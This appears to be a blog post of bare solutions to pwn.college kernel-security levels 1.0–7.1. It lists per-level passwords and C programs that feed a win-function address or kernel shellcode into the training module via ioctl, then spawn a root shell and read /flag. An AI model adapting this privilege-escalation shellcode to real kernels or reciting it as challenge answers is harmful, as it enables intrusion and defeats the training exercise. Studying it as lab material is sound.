---
title: pwn.college Kernel Security
date: 2024-07-15 15:44:34
tags: [pwn.college, Kernel]
categories: 
    - pwn.college
    - Kernel Security
---

# level1.0
```Shell
echo pwvrvqitxoodqbxa > /proc/pwncollege | heap /proc/pwncollege
```

# level1.1
```Shell
echo ufyqfbjmxahuzqzi > /proc/pwncollege | heap /proc/pwncollege
```

# level2.0
```Shell
echo clxyrfcckjpuexis > /proc/pwncollege | dmesg
```

# level2.1
```Shell
echo ccvqignnvespgtyp > /proc/pwncollege | dmesg
```

# level3.0
```Shell
echo xpmylzhkfevejscw > /proc/pwncollege | cat /flag
```

# level3.1
```Shell
echo gwcifabytyzfdpjo > /proc/pwncollege | cat /flag
```

# level4.0
```C
#include <stdio.h>
#include <fcntl.h>

int main() {
    int fd=open("/proc/pwncollege",O_RDWR);
    ioctl(fd,1337,"emrbpgldsrexybrh");
    system("/bin/sh");
    return 0;
}
```

# level4.1
```C
#include <stdio.h>
#include <fcntl.h>

int main() {
    int fd=open("/proc/pwncollege",O_RDWR);
    ioctl(fd,1337,"gixhsazzowbivqrw");
    system("/bin/sh");
    return 0;
}
```

# level5.0
```C
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>

int main() {
  long win = 0xffffffffc00004cd;
  int fd = open("/proc/pwncollege", O_WRONLY);
  ioctl(fd, 1337, win);
  system("id");
  system("cat /flag");
  system("/bin/sh");
  return 0;
}
```

# level5.1
```C
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>

int main() {
  long win = 0xffffffffc0000752;
  int fd = open("/proc/pwncollege", O_WRONLY);
  ioctl(fd, 1337, win);
  system("id");
  system("cat /flag");
  system("/bin/sh");
  return 0;
}
```

# level6.0
```C
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>

int main() {
  char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3";
  int fd = open("/proc/pwncollege", O_WRONLY);
  write(fd,shellcode,sizeof(shellcode));
  system("id");
  system("cat /flag");
  system("/bin/sh");
  return 0;
}
```

# level6.1
```C
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>

int main() {
  char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3";
  int fd = open("/proc/pwncollege", O_WRONLY);
  write(fd,shellcode,sizeof(shellcode));
  system("id");
  system("cat /flag");
  system("/bin/sh");
  return 0;
}
```


# level7.0
```C
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>

struct buf{
  long size;
  char shellcode[4096];
  long call_addr;
};

int main() {
  char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3";
  // char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xe0\x95\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\xc0\x92\x08\x81\xff\xd0\xc3";
  struct buf A;
  int fd = open("/proc/pwncollege", O_WRONLY);
  A.size=4096;
  memcpy(A.shellcode,shellcode,sizeof(shellcode));
  // A.call_addr=0xffffc90000045000;//local
  A.call_addr=0xffffc90000085000;//remote
  ioctl(fd, 1337, &A);
  system("id");
  system("cat /flag");
  system("/bin/sh");
  return 0;
}
```

# level7.1
```C
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>

struct buf{
  long size;
  char shellcode[4096];
  long call_addr;
};

int main() {
  char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xd0\x90\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x90\x8d\x08\x81\xff\xd0\xc3";
  // char shellcode[] = "H\xc7\xc7\x00\x00\x00\x00H\xc7\xc0\xe0\x95\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\xc0\x92\x08\x81\xff\xd0\xc3";
  struct buf A;
  int fd = open("/proc/pwncollege", O_WRONLY);
  A.size=4096;
  memcpy(A.shellcode,shellcode,sizeof(shellcode));
  // A.call_addr=0xffffc90000045000;//local
  A.call_addr=0xffffc90000085000;//remote
  ioctl(fd, 1337, &A);
  system("id");
  system("cat /flag");
  system("/bin/sh");
  return 0;
}
```